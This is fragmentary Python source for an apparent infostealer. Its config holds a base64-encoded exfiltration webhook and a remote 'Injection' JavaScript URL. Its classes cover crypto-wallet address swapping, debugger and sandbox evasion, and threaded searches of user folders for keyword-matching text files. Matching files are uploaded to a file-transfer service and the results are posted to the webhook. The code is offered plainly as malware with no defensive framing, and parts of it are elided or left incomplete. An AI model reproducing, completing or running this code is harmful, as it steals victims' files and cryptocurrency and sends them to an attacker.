...
__config__ = {
    # Basic Options
    "secret_webhook": "%WEBHOOK_HERE%",
    "please_injection_url": f"https://raw.githubusercontent.com/{mynameis}/{mynameis}-Injection/main/index.js",
...
class AutoCopyWallet(Functions):
    def __init__(self):
        self.address_st3aler = self.find_in_config("please_crypto_fucker")
        self.addresses = {
...
class first_function_bc(Functions):
    def __init__(self):
        ...
        self.ddeco = f'{base64.b64decode(self.find_in_config("secret_webhook"))}'.replace(
            "b'", "").replace("'", "")
        ...
        self.customcreator = self.find_in_config("grb_creator")
...
class NoDebugg(Functions):
    ...
    def Check_and_Spec(self):
        fast_memory_storage = int(self.fast_memory_storage)
...
hooks = f'{base64.b64decode(find_in_config("secret_webhook"))}'.replace(
    "b'", "").replace("'", "")
hook = str(hooks)
...
def CreateFolder_(pathF, keywords):
    ...
    for file in listOfFile:
        ...
        i += 1
        if i <= maxfilesperdir:
            url = Upload_to_transfer(pathF + "/" + file)
            ffound.append([pathF + "/" + file, url])
        else:
            break
    please_create_files.append(["folder", pathF + "/", ffound])


please_create_files = []


def please_create_file(path, keywords):
    global please_create_files
    fifound = []
        ...
        for worf in keywords:
            if worf in file.lower():
                if os.path.isfile(path + "/" + file) and ".txt" in file:
                    fifound.append(
                        [path + "/" + file, Upload_to_transfer(path + "/" + file)]
                    )
                    break
                if os.path.isdir(path + "/" + file):
                    ...
                    break
    please_create_files.append(["folder", path, fifound])


def please_check_this():
    ...
    for patt in path2search:
        please_check_this = threading.Thread(
            target=please_create_file, args=[patt, key_wordsFiles]
        )
        please_check_this.start()
        wikith.append(please_check_this)
    return wikith
...
if not DETECTED:
    ...
    filetext = "```diff\n"
    for arg in please_create_files:
        if len(arg[2]) != 0:
            foldpath = arg[1]
            foldlist = arg[2]
            filetext += f"\n"
    ...
    upload("please_check_this", filetext)
